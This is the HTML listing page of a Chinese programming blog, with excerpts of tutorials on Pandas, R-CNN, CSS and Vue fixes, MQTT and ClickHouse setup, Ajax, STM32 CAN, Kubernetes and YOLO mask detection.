<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61d87f92b135aac12926c1631720eac8/" rel="bookmark">
			Python中Pandas详解之数据结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Pandas 数据分析Pandas 简介Pandas 安装Series 类型数据Series的创建Series的访问Series 中向量化操作与布尔索引Series的切片Series的缺失值Series的增与删Series的name DataFrame 数据类型DataFrame的创建DataFrame的访问DataFrame的删除DataFrame的添加添加行添加列 Pandas 数据分析 Pandas 简介 Pandas是Python生态下的一个数据分析包，他对于Python数据分析的意义是十分重大的，他与NumPy的不同之处是支持图标和混杂数据运算的，而NumPy是基于数组构建的内容，他的各种图像生成也十分方便，并且支持各种数据存储文件、数据库、甚至Web中读取数据
Pandas 安装 和NumPy的安装一样使用
pip install pandas 命令安装即可
Series 类型数据 Series是Pandas的核心数据结构之一，也是理解DataFrame的基础
Series的创建 Series的中文翻译是系列，是一种类似于一维数组的结构，是数组和索引构成的
import pandas as pd pd.Series(data, index = index) 在这两个参数中，data是数据源，可以是整数，字符串等，而默认索引就是数据的标签(label)
例如
a = pd.Series([1, 2, 5, 3, 2]) print(a) 需要注意的是Series的内部是基于NumPy的N维数组构建的，因此内部的数据需要统一
其次Series增加对应的label作为索引，如果没有显示添加索引，Python会自动添加一个0到n-1的索引值，通常都是索引在左，数值在右边
当然，其中的索引也可以被更改为其他的内容，是类似于Python中的字典
Series还提供了一些简单的统计方法，describe()
例如
print(a.describe()) 参数说明count数据个数mean均值std均方差min最小值max最大值25%前25%的数据分位数50%前50%的数据分位数75%前75%的数据分位数 Series的访问 第一种最简单的访问方式就是通过下标存取Series对象内部的元素
当然也可以用label进行访问
需要说明的是，可以按照任意顺序一次访问多个数据
例如
print(a[[1,2,3]]) 需要说明的是，同时访问多个数值就需要以列表的形式出现
对于两个Series对象还可以通过append()方法进行叠加操作，用来合并对象
但是当叠加对象时，索引就会混乱，因此当叠加时可以采用ignore_index=True，这样就可以重新添加索引
例如
a1.append(a2,ignore_index=True) Series 中向量化操作与布尔索引 类似于NumPy，Pandas也支持广播操作，也就是加减乘除一个标量，
同样的Series也支持用布尔表达式提取符合条件的数值，而且Series也可以作为NumPy函数的一个参数进行数据运算
Series的切片 对于Series也可以使用切片操作选取处理其中的值，返回值依然是Series的对象
需要注意的时，与数字的切片不同，用label切片不是左闭右开，而是两边都是闭区间
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61d87f92b135aac12926c1631720eac8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2d6035f87aa16129275c546af9ccb5a/" rel="bookmark">
			目标检测-Two Stage-RCNN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、R-CNN的网络结构及步骤二、RCNN的创新点候选区域法特征提取-CNN网络 总结 前言 在前文：目标检测之序章-类别、必读论文和算法对比（实时更新）已经提到传统的目标检测算法的基本流程：
图像预处理 =&gt; 寻找候选区 =&gt; 特征提取 =&gt; 分类器分类 =&gt; 后处理
传统目标检测的主要问题是：
1）寻找候选区的方法缺陷：基于滑动窗口的区域选择策略没有针对性，时间复杂度高，窗口冗余，速度慢2）手工设计的特征对于多样性的变化没有很好的鲁棒性 2012年，卷积神经网络（CNN）开始大放异彩，开启了基于深度学习算法图像分类的热潮。
2014年，RBG（Ross B. Girshick）使用Region Proposal + CNN代替传统目标检测使用的滑动窗口+手工设计特征，设计了R-CNN框架，使得目标检测取得巨大突破，并开启了基于深度学习目标检测的热潮。
为了解决上述传统目标检测需要遍历图像的缺陷，出现了候选区域（Region Proposal）法：即利用图像中的纹理、边缘、颜色等信息，预先找出图中可能含有物体的候选区域/框，可以保证在选取较少窗口(几千甚至几百）的情况下保持较高的召回率（Recall），文中使用的是Selective Search候选区域法。
R-CNN在PASCAL VOC 2010上实现了53.7%的平均精度（mAP)，并在VOC 2011/12 test（测试集）中实现了类似的性能（53.3% mAP）
提示：以下是本篇文章正文内容，下面内容可供参考
一、R-CNN的网络结构及步骤 提取候选区域（Region Proposal） ps：利用Selective Search算法在图像中从下到上提取2000个左右的可能包含物体且大小不一的候选区域Region Proposal
预训练分类模型（如AlexNet）+ 微调（fine-tuning） / 从头开始训练模型利用训练好的模型进行特征提取，获取候选区特征图 ps：将每个Region Proposal缩放（warp）成统一的227x227的大小并输入到CNN网络，将CNN网络的输出作为特征
训练一个SVM分类器，根据CNN特征图进行分类，利用非极大值抑制（NMS）去除冗余候选区训练一个线性回归模型，精修正确的候选框位置及大小 二、RCNN的创新点 使用候选区域法（Region Proposal）代替穷尽策略，大大缩小了计算量利用CNN参数共享和特征提取的优势，改善了提取特征的速度和质量 候选区域法 有很多候选区域法，当时最出色的是选择性搜索（selective search）。它的工作原理是将图片中的每一个像素作为一组，然后计算每个像素的纹理，将相近的的组合起来形成更大的像素组，然后继续合并各个像素组。下图中展示了像素组是如何扩大的，蓝色矩形代表了真实图片各像素组合并后的外界矩形框。
特征提取-CNN网络 原文中使用的是AlexNet，当然也可以使用其他卷积神经网络。
总结 R-CNN虽然不再像传统方法那样穷举，但R-CNN流程的第一步中对原始图片通过Selective Search提取的候选框region proposal多达2000个，且这2000个候选框每个框都需要进行CNN提特征+SVM分类，计算量很大，导致R-CNN检测速度很慢，GPU上大于13s/image，CPU上大于53s/image。
其次，将所有候选区域统一缩放到统一大小（CNN输入大小是确定的）会导致图像变形失真，从而降低精度。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edc8b2a7b5ce1fe80378ff03d781f059/" rel="bookmark">
			解决IOS transform rotate后文字无法显示，backface-visibility导致@click事件失效
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题一：IOS transform rotate后文字无法显示 网上搜到可以用backface-visibility:hidden来解决，这样做文字是出来了，但是click事件无效了。
问题二：backface-visibility导致@click事件失效 在Vue中使用backface-visibility和@click可能会造成冲突，因为backface-visibility会影响元素背面的可见性，而@click是用来绑定点击事件的。当元素被旋转后，背面不可见时，点击事件可能无法触发。
为了解决这个问题，你可以尝试以下方法：
使用透明度（opacity）代替backface-visibility：
改用透明度来隐藏背面元素，而不是使用backface-visibility。
.element { transform: rotateY(180deg); opacity: 0.999; /* 或者一个极接近于1的值 */ } 通过将元素的透明度设置为一个极接近于1的值，而非1本身，来“隐藏”背面元素。这样可以保持背面元素不可见的同时，保持点击事件的可触发性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/327a80b8f54c8b15ccf9cbe1ad7c0535/" rel="bookmark">
			这么简单的环境搭建，网友：我却搭了很久，结果还是不行...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 大家好，我是麦叔，之前有小伙伴建议出一期如何快速搭建一个MQTT协议的测试环境，因为自己写的mqtt测试工具总是有这样那样的问题。
其实这里要合理地使用现有的工具，其实很简单，几步可以搞定，下面我们开始介绍。
目录 前言
目录
系统架构
准备工具
代理服务器
客户端
验证消息传递
订阅主题
发布主题
系统架构 通常我们需要这些东西；
一个MQTT代理服务器（Broker），作为MQTT消息的中转；
MQTT客户端，可以进行订阅消息（接收），发布消息（发送）
注意：客户端只能接收到已经订阅主题的相关消息，这里如果不清楚，建议把MQTT协议基础再看一下；
我们需要搭建的整体架构如下所示；
准备工具 要快速搭建MQTT测试环境，可以使用以下步骤：
代理服务器 安装代理服务器，MQTT Broker：选择一个MQTT Broker来搭建测试环境。
常用的MQTT Broker有Mosquitto、HiveMQ、EMQ X等。
我们可以根据自己的需求选择其中一个来安装。
本文使用Mosquitto在Windows系统上进行安装作为示例：
对于Windows系统，从Mosquitto官方网站下载并安装Windows版本。
https://mosquitto.org/download/ 根据自己的系统进行下载，通常64位的系统下载相应的软件进行安装即可；
注意：安装路径按照实际的情况即可；
在当前的路径下创建一个配置文件mosquitto.conf，配置文件输入的内容如下：
listener 1883 protocol mqtt listener 9005 protocol websockets allow_anonymous true log_type notice log_type websockets log_type warning log_type error log_type information 在当前路径下打开dos或者powershell，输入指令
mosquitto -c mosquitto.conf 代理服务器开始运行；
客户端 客户端MQTT Client我们也可以用现成的工具，本文使用MQTT X，如下所示；
下载地址：
https://mqttx.app/downloads 选择适合自己系统的版本，进行安装即可；
通常，有几个参数需要进行配置；
Client ID：客户端的ID，这里需要保证唯一性；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/327a80b8f54c8b15ccf9cbe1ad7c0535/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5aa67cf66facf650bf9cc5e7a110fc5e/" rel="bookmark">
			将elementUI，NaiveUI的progress环形进度条设置为渐变色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求 ：进度条要有一个渐变效果。效果图：
NaiveUI和elementUI的官方progress组件都是只能设置一种颜色，不符合需求所以改一下。
其实NaiveUI和elementUI设置进度条的实现方式基本一样都是使用svg渲染出两个path，第一个是底色，第二个是进度条。
elementUI的：NaiveUi的：
可以看到唯一的区别就是 NaiveUi的path外层多包裹了一个g标签。
实现思路就是我们自己创建一个可以有过度色的svg来替换掉第二个path。
设置NaiveUI： &lt;n-progress class="progressClass" :type="type" :height="h" :processing="processing" :percentage="dataset" :indicator-placement="indicatorPlacement" :rail-color="railColor" :offset-degree="offsetDegree" &gt; // 创建一个svg &lt;svg&gt; &lt;defs&gt; &lt;linearGradient id="gradient" x1="1" y1="0.4" x2="0.3" y2="1"&gt; // 设置过度 &lt;stop offset="0%" :style="{ 'stop-color': color }" stop-opacity="1"&gt;&lt;/stop&gt; &lt;stop offset="50%" :style="{ 'stop-color': color2 }" stop-opacity="1"&gt;&lt;/stop&gt; &lt;stop offset="100%" :style="{ 'stop-color': color3 }" stop-opacity="1"&gt;&lt;/stop&gt; &lt;/linearGradient&gt; &lt;/defs&gt; &lt;/svg&gt; &lt;/n-progress&gt; // css &lt;style scoped lang="scss"&gt; // 找到第二个path并将他的stroke替换为我们创建的svg .progressClass { position: relative; :deep(svg &gt; g:nth-child(2) path) { stroke: url(#gradient) !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5aa67cf66facf650bf9cc5e7a110fc5e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40d308964282c4c7c3fc605f1a489ac5/" rel="bookmark">
			3分钟快速安装 ClickHouse、配置服务、设置密码和远程登录以及修改数据目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面是一个完整的 ClickHouse 安装和配置流程，包括安装 ClickHouse、配置服务、设置密码和远程登录以及修改数据目录。
安装 ClickHouse 安装 YUM 工具包：
sudo yum install -y yum-utils 添加 ClickHouse YUM 仓库：
sudo yum-config-manager --add-repo https://packages.clickhouse.com/rpm/clickhouse.repo 安装 ClickHouse 服务器和客户端：
sudo yum install -y clickhouse-server clickhouse-client 启用并启动 ClickHouse 服务：
sudo systemctl enable clickhouse-server sudo systemctl start clickhouse-server sudo systemctl status clickhouse-server 连接到 ClickHouse 客户端（如果未设置密码）：
clickhouse-client 配置 ClickHouse 配置默认用户密码（这是明文的配置步骤，下面有密文的配置步骤） 要将 ClickHouse 中的 default 用户密码设置为 AAAaaa，请按照以下步骤操作：
打开 ClickHouse 配置文件。这通常在 /etc/clickhouse-server/users.xml 或 /etc/clickhouse-server/users.d/ 目录下。
找到 &lt;users&gt; 部分下的 &lt;default&gt; 用户配置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40d308964282c4c7c3fc605f1a489ac5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7603dc225e6c20dc2528c5938057c516/" rel="bookmark">
			31. Ajax
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 AJAX 是 Asynchronous JavaScript And XML 的简称。直译为，异步的JS和XML。AJAX的实际意义是，不发生页面跳转、异步载入内容并改写页面内容的技术。AJAX也可以简单的理解为通过JS向服务器发送请求。 AJAX这门技术很早就被发明，但是直到2005年被谷歌的大量使用，才在市场中流行起来，可以说Google为AJAX的推广起到到推波助澜的作用。
同步处理： AJAX出现之前，我们访问互联网时一般都是同步请求，也就是当我们通过一个页面向服务器发送一个请求时，在服务器响应结束之前，我们的整个页面是不能操作的，也就是直观上来看他是卡主不动的。这就带来了非常糟糕的用户体验。首先，同步请求时，用户只能等待服务器的响应，而不能做任何操作。其次，如果请求时间过长可能会给用户一个卡死的感觉。最后，同步请求的最大缺点就是即使整个页面中只有一小部分内容发生改变我们也要刷新整个页面。 异步处理： 而异步处理指的是我们在浏览网页的同时，通过AJAX向服务器发送请求，发送请求的过程中我们浏览网页的行为并不会收到任何影响，甚至主观上感知不到在向服务器发送请求。当服务器正常响应请求后，响应信息会直接发送到AJAX中，AJAX可以根据服务器响应的内容做一些操作。使用AJAX的异步请求基本上完美的解决了同步请求带来的问题。首先，发送请求时不会影响到用户的正常访问。其次，即使请求时间过长，用户不会有任何感知。最后，AJAX可以根据服务器的响应信息局部的修改页面，而不需要整个页面刷新。 请求对象 向服务器发送请求，毫无疑问需要使用Http协议，也就是我们需要通过JS来向服务器发送一个请求报文。这里我们来回顾一下请求报文的格式：
这是一个请求报文的格式，那我们如果手动的创建这么一个报文格式来发送给服务器想必是非常麻烦呢，于是浏览器为我们提供了一个XMLHttpRequest对象。
XMLHttpRequest XMLHttpRequest对象是AJAX中非常重要的对象，所有的AJAX操作都是基于该对象的。XMLHttpRequest对象用来封装请求报文，我们向服务器发送的请求信息全部都需要封装到该对象中。这里需要稍微注意一下，XMLHttpRequest对象并没有成为标准，但是现在的主流浏览器都支持该对象，而一些如IE6的老版本浏览器中的创建方式有一些区别，但是问题不大。 获取XMLHttpRequest对象：
由于浏览器之间的差异，不同浏览器中获取XMLHttpRequest的方式不同，但总的来说一共有三种方式： var xhr = new XMLHttpRequest() 目前主流浏览器都支持 var xhr = new ActiveXObject(“Msxml2.XMLHTTP”) IE6支持的方式 var xhr = new ActiveXObject(“Microsoft.XMLHTTP”) IE5.5一下支持的方式 根据三种不同的方式编写通用方法来获取XMLHttpRequest对象：
//获取XMLHttpRequest的通用方法 function getXMLHttpRequest(){ var xhr; try{ //大部分浏览器都支持 xhr = new XMLHttpRequest(); }catch(e){ try{ //如果不支持，在这里捕获异常并且采用IE6支持的方式 xhr = new ActiveXObject("Msxml2.XMLHTTP"); }catch(e){ //如果还不支持，在这里捕获异常并采用IE5支持的方式 xhr = new ActiveXObject("Microsoft.XMLHTTP"); } } return xhr; } XMLHttpRequest对象的方法：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7603dc225e6c20dc2528c5938057c516/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d11a5150f85b8b9050a39933908466be/" rel="bookmark">
			STM32——CAN协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一.CAN协议的基本特点1.1 特点1.2 电平标准1.3 基本的五个帧1.4 数据帧 二.数据帧解析2.1 帧起始和仲裁段2.2 控制段2.3 数据段和CRC段2.4 ACK段和帧结束 三.总线仲裁四.位时序五.STM32CAN控制器原理与配置5.1 STM32CAN控制器介绍5.2 CAN的模式5.3 CAN框图 六 手册寄存器部分讲解6.1 DBF冻结功能和TTC时间戳6.2 ABOM自动离线管理和AWUM自动唤醒6.3 NART自动重传，RFLM锁定模式和TXFP报文发送优先级的判断方法6.4 波特率设置6.5 发送邮箱6.6 接收FIFO6.7 验收筛选器 七.CAN的结构体设置讲解7.1 结构体总结7.2 初始化结构体7.3 发送结构体7.4 接收结构体7.5 筛选器结构体 八.CAN的原理图和接线九.CAN的回环模式进行自检通过串口发送数据代码 一.CAN协议的基本特点 1.1 特点 1.2 电平标准 总结就是显性电平是0，隐性电平是1，很多单元设备挂在主设备上时，主单元是相当于总线，其他单元只要有一个输出0，总线就显示0，只要其他单元全部输出1，总线就是1
1.3 基本的五个帧 这里最重要的是数据帧，也是最复杂的
1.4 数据帧 串口的一帧率是10-11位，起始位，数据位8位(一字节)，(校验位)，停止位,而CAN的一帧是七个段组成的，如下图所示，帧起始就是跟串口起始位一样，仲裁段是表示优先级，也就是ID，控制段如下图，一帧数据段最多发送8字节(64位)，CRC段就是检查上面的所有段有没有错误，ACK表示收到了正确的段，帧结束就是相当于串口的停止位。
二.数据帧解析 2.1 帧起始和仲裁段 帧起始是一位显性电平0，然后到11位的仲裁段(看蓝色区域，高低电平看ID号，高位在前，低位在后，这里ID11位的话，高7位是不能都是隐形电平1)，然后仲裁段后面跟了一个RTR远程请求位0或者1和一个IDE标识符选择请求位0(这里没有显示出来，因为在控制段里面了)，RTR如果是0就是数据帧，数据帧的意思就是后面的数据段是有数据的，如果是1，表示这是一个远程帧，远程帧的意思就是后面的数据段是不存在的，DLC控制段也是0的，远程帧用于请求其他节点发送数据帧。上面说的仲裁位都是标准格式，如果需要扩展，在仲裁位的基础下，把原来的RTR替换成SRR替代远程请求位1，IDE变成扩展标识符1。
2.2 控制段 标准格式下，IDE就是上面说的，在控制段里面为0，然后就是R0，发送的话必须是0，接受的话可以是1，再加上控制段DLC(0—8位)，扩展格式下，先r1和r0两个保留位，也是发送必须是0，接受可以是1，再加上DLC控制端(0—8位)。
2.3 数据段和CRC段 (1).数据段的标准格式和扩展格式是一样的都是0-64位，然后数据段是从最高位(MSB),开始输出的，跟串口不一样，串口是低位(LSB)先输出，而CAN是高位先输出的。
(2).CRC段也是标准格式和扩展格式一致都是15位加上一位CRC界定符(用于分隔的位)，CRC计算方法就是帧起始+仲裁段+控制端+数据段，最后校验得到这个。
2.4 ACK段和帧结束 (1).ACK段的标准格式和扩展格式是一致的，ACK段分为ACK槽和ACK界定，发送单元发给接受单元的数据没有错后(CRC检测没有错误以后)，发送单元会接受到接受单元发送的发送单元ACK段11，发送单元接受到了接受单元发的ACK后，会有一个响应，就是接受单元ACK段0。
(2).帧结束的标准格式和扩展格式是一样的，由于7个位的1组成。
三.总线仲裁 (1).必须同时两个或者两个以上的单元发送数据给主单元，才能进行仲裁(优先级)，在总线空闲时，最先发送的单元获得发送权，或者同时发送时，则连续输出0(ID)多的单元，则优先发送,如果ID一样，则比较RTR和SRR等位。
(2).例如下图，单元1和单元2同时发送，单元1在红色位置时发送1，而单元2还是发送0，所以，单元1从下一位开始就进入接受状态，单元2优先发送。
四.位时序 (1).位时序就是设置波特率(传输速度)，位速率就是一个发送单元发送每秒的位数叫做位速率(传输速度)，位速率又分成四个段(如下图一)，CAN协议把每个数据位(数据位就是例如串口里面那个起始位，数据位什么的)都分解成了四段，每个段又由若干个Tq的最小时间单位构成，然后我们想设置波特率的话，就要知道位时间(传输每位的时间)，想设置位时间的话，就要知道波特率，位时间=1/波特率。
(2).四个段如图二进行解析。
(3).同步段就是有多个连接在总线上的单元通过此段进行时序调整来同时发送和接受数据，时序都是1到0的一个下降沿，或者0到1的一个上升沿，如图三,这些跳变作为时间基准，用于进行时钟同步和数据位的采样,为1Tq。
(4).传播时间段就是总线上的信号传播延迟，接收单元的输入延迟和发送单元的输出延迟，这个传播时间段的时间为总线上的信号传播延迟，接收单元的输入延迟和发送单元的输出延迟的时间的和的2倍，通常是1—8Tq。
(5).相位缓冲段1的作用是当信号边沿不能被包含于同步段中时，可以用它来进行补偿，通常为1-8Tq。
(6).相位缓冲段2的作用就是各个单元以独立时钟工作时，细微的时钟累计起来就会造成误差，它的作用就可以吸收这个误差。可以通过相位缓冲段加减SJW(SJW名为再同步补偿宽度，用于时钟频率偏差，传送延迟等各个单元有同步误差，SJW可以补充此误差的最大值，SJW不属于这四个段的，为1—4Tq)来吸收误差，SJW加大以后允许误差加大，但是通信速度降低，相位缓冲段2通常为2—8Tq。
(7).在STM32上面传播时间段和相位缓冲段1是加在一起的BS1，然后相位缓冲段2是BS2，就只有这两个时间。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d11a5150f85b8b9050a39933908466be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e501cf969a3aadc39222d015de716dec/" rel="bookmark">
			【K8S 基本概念】Kurbernetes的架构和核心概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、Kurbernetes
1.1 简介
1.2、K8S的特性：
1.3、docker和K8S：
1.4、K8S的作用：
1.5、K8S的特性：
二、K8S集群架构与组件：
三、K8S的核心组件：
一、master组件：
1、kube-apiserver：
2、kube-controller-manager：
3、kube-scheduler：
4、ETCD组件：
二、node组件：
1、kubelet：
2、kube-proxy：
3、docker：
4、pod：
5、deployment：
6、replicaset：
7、daemonset：
8、statefulset：
9、job：
10、cronjob：
11、service：
12、label：
13、ingress：
14、namespace：
一、Kurbernetes 1.1 简介 K8S：kubernets中间8个字母省略就是K8S
K8S是负责自动化运维管理多个容器化程序的集群，是一个功能强大的容器编排工具。可以以分布式和集群化的方式进行容器管理
能提供自动部署，自动扩展和管理容器化部署的应用程序的一个开源的系统
K8S是Google研发的borg系统作为原型，后期经go语言编写的开源软件
Kubernetes 官网
GitHub - kubernetes/kubernetes: Production-Grade Container Scheduling and Management 源码包
市面上的版本：
1.15、1.18、1.20
我们使用的是1.20
1.2、K8S的特性： 1、强大的容器编排能力
作为容器编排管理平台，拥有强大的容器编排能力。
Kubernetes 与 Docker 共同发展并且深度集成了 Docker，因此适应容器的特点，比如容器组合、标签选择和服务发现等，可以满足企业级的需求，具体表现如下：
以 Pod（容器组）为基本的编排和调度单元以及声明式的对象配置模型（控制器、configmap、secret 等）
资源配额与分配管理
健康检查、自愈、伸缩与滚动升级
2、轻量级
轻量级，对微服务架构有很好的支撑。
微服务架构的核心是将一个巨大的单体应用分解为很多小的互相连接的微服务，一个微服务可能由多个实例副本支撑，副本的数量可以随着系统的负荷变化进行调整。
整个系统划分出各个功能独立的组件，组件之间边界清晰、部署简单，以及很多功能实现了插件化，可以非常方便地进行扩展和替换：
服务发现、服务编排与内部路由支持
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e501cf969a3aadc39222d015de716dec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa6eaef6ebb173671087471d3cee63d0/" rel="bookmark">
			Vue实现响应式布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前提准备：响应式布局有两种方法，看自己想要哪种。
方法一：百分比 用百分比去写元素的宽度，然后让子元素撑起父元素的高度
.parent { width: 50%; } .child { width:100%; height:100px; } 方法二：vh、vw vw、vh是基于视口的布局方案，所以这个meta元素的视口必须声明。（解决宽高自动适配）
&lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"&gt; .box{ width:50vw; height: 20vh; line-height: 20vh; font-size: 1.5rem; background-color: yellow; } 50vw的意思是占视口宽度的一半，20vh占视口高度的20%，随着视口的变化自适应。
在所需页面中选择合适的方法，然后开始进行下面的配置
开始配置（不使用媒体查询） 使用postcss-px2rem----修改单位（包括第三方组件） 帮我们自动将px单位转换成rem单位（主要是转换不是我们自己写的页面尺寸，比如elementUI中的尺寸就会改变，除了行内）
注意：UI框架部分组件使用JavaScript将css作为内联样式直接写在html标签内，打包适配时不会读取相关css,所以要配置相关样式，在style中需要" !important "进行样式覆盖。
使用postcss-px2rem-exclude---修改单位（不包括第三方组件）
帮我们自动将px单位转换成rem单位（此插件的功能是为了排除 node_modules 中的所有第三方插件，所以第三方组件库的样式就不会被受到影响。比如elementUI就不会转换单位了）
我们使用postcss-plugin-px2rem-----指定某一文件下所以css文件不进行单位转换（推荐） 第一步：npm下载插件 帮我们自动将px单位转换成rem单位（配置 是否对 某个文件夹下的所有css文件不进行从px到rem的转换）
npm i postcss-plugin-px2rem 第二步：配置vue.config.js devserve:{}, css: { loaderOptions: { postcss: { postcssOptions: { plugins: [ require('postcss-plugin-px2rem')({ rootValue: 80, //换算基数， 默认100 ，这样的话把根标签的字体规定为1rem为50px,这样就可以从设计稿上量出多少个px直接在代码中写多上px了。 // unitPrecision: 5, //允许REM单位增长到的十进制数字。 //propWhiteList: [], //默认值是一个空数组，这意味着禁用白名单并启用所有属性。 // propBlackList: [], //黑名单 exclude: /(node_module)/, //默认false，可以（reg）利用正则表达式排除某些文件夹的方法，例如/(node_module)/ 。如果想把前端UI框架内的px也转换成rem，请把此属性设为默认值 // selectorBlackList: [], //要忽略并保留为px的选择器 // ignoreIdentifier: false, //（boolean/string）忽略单个属性的方法，启用ignoreidentifier后，replace将自动设置为true。 // replace: true, // （布尔值）替换包含REM的规则，而不是添加回退。 mediaQuery: false, //（布尔值）允许在媒体查询中转换px。 minPixelValue: 3 //设置要替换的最小像素值(3px会被转rem)。 默认 0 }) ] } } } }, 第三步：屏幕自适应 使用flexible.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa6eaef6ebb173671087471d3cee63d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b35222fe3720b98bc3bc6f1c045fa435/" rel="bookmark">
			竞赛保研 基于YOLO实现的口罩佩戴检测 - python opemcv 深度学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 前言1 课题介绍2 算法原理2.1 算法简介2.2 网络架构 3 关键代码4 数据集4.1 安装4.2 打开4.3 选择yolo标注格式4.4 打标签4.5 保存 5 训练6 实现效果6.1 pyqt实现简单GUI6.3 视频识别效果6.4 摄像头实时识别 7 最后 0 前言 🔥 优质竞赛项目系列，今天要分享的是
🚩 **基于YOLO实现的口罩佩戴检测 **
该项目较为新颖，适合作为竞赛课题方向，学长非常推荐！
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：4分创新点：4分 🧿 更多资料, 项目分享：
https://gitee.com/dancheng-senior/postgraduate
1 课题介绍 受全球新冠肺炎疫情影响，虽然目前中国疫情防控取 得了良好效果，绝大多数地区处于疫情低风险，但个别地 区仍有零星散发病例和局部聚集性疫情。在机场、地 铁
站、医院等公共服务和重点机构场所规定必须佩戴口罩， 口罩佩戴检查已成为疫情防控的必备操作。目前，口罩 佩戴检查多为人工检查方式，如高铁上会有乘务人员一节
节车厢巡逻检查提醒乘客佩戴口罩，在医院等高危场所也 会有医务人员提醒时刻戴好口罩。人工检查方式存在检 查效率低下、难以及时发现错误佩戴口罩以及未佩戴口罩
行为等弊端。采用深度学习目标检测方法设计一个具有口罩识别功能的防疫系统，可以大大提高检测效率。
2 算法原理 2.1 算法简介 YOLOv5是一种单阶段目标检测算法，该算法在YOLOv4的基础上添加了一些新的改进思路，使其速度与精度都得到了极大的性能提升。主要的改进思路如下所示：
输入端：在模型训练阶段，提出了一些改进思路，主要包括Mosaic数据增强、自适应锚框计算、自适应图片缩放；
基准网络：融合其它检测算法中的一些新思路，主要包括：Focus结构与CSP结构；
Neck网络：目标检测网络在BackBone与最后的Head输出层之间往往会插入一些层，Yolov5中添加了FPN+PAN结构；
Head输出层：输出层的锚框机制与YOLOv4相同，主要改进的是训练时的损失函数GIOU_Loss，以及预测框筛选的DIOU_nms。
2.2 网络架构 上图展示了YOLOv5目标检测算法的整体框图。对于一个目标检测算法而言，我们通常可以将其划分为4个通用的模块，具体包括：输入端、基准网络、Neck网络与Head输出端，对应于上图中的4个红色模块。YOLOv5算法具有4个版本，具体包括：YOLOv5s、YOLOv5m、YOLOv5l、YOLOv5x四种，本文重点讲解YOLOv5s，其它的版本都在该版本的基础上对网络进行加深与加宽。
